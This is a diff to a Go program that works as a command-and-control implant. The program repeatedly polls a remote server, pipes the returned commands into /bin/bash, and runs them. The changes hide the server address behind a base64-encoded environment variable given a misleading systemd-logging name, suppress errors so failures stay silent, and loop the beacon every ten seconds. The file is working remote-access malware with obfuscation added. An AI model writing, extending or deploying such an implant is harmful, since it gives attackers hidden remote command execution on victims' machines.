@@ -5,23 +5,27 @@
 package main
 
 import (
-	"bytes"
+	b64 "encoding/base64"
 	"fmt"
+	"io"
 	"io/ioutil"
 	"net"
 	"net/http"
 	"os"
 	"os/exec"
+	"strings"
+	"time"
 )
 
-var serv = "192.168.58.132:5000" //IP of flask serv
-var src = "GoBin"                // where is this calling back from
-var loopTime = 10                //sleep time in secs
+var serv = getServer() //IP of flask serv
+var src = "GoBin"      // where is this calling back from
+var loopTime = 10      //sleep time in secs
 
-// get hostname and return it as a string
-func getHn() string {
-	hn, _ := os.Hostname()
-	return hn
+func getServer() string {
+	envVar := os.Getenv("DEBUGGER_LOGGING") //fetch environment variable
+	trimmedStr := strings.Replace(envVar, "/var/log/systemd-", "", 1)
+	decoded, _ := b64.StdEncoding.DecodeString(trimmedStr)
+	return string(decoded)
 }
 
 func getIP() string {
@@ -34,27 +38,32 @@ func getIP() string {
 
 func getCommands() {
 	ip := getIP()
-	url := "http://" + serv + "/api/callback/" + ip + "/" + src
+	url := "http://" + serv + "/" + ip + "/" + src
 	r, err := http.Get(url)
 	if err != nil {
-		panic(err)
+		return
 	}
 	defer r.Body.Close()
 	txt, err := ioutil.ReadAll(r.Body)
 	if err != nil {
-		panic(err)
+		return
 	}
 	fmt.Printf("commands: \n%s\n", txt)
 	//exec.Command(string(txt))
-	bsh := exec.Command("/bin/bash", "")
-	var buffer bytes.Buffer
-	buffer.Write([]byte(txt))
-
-	bsh.Stdin = &buffer
+	bsh := exec.Command("/bin/bash")
+	stdin, _ := bsh.StdinPipe()
+	go func() {
+		defer stdin.Close()
+		io.WriteString(stdin, string(txt))
+	}()
 	bsh.Run()
 }
 
 func main() {
-	getCommands()
+	for {
+
+		getCommands()
+		time.Sleep(time.Duration(loopTime) * time.Second)
+	}
 
 }
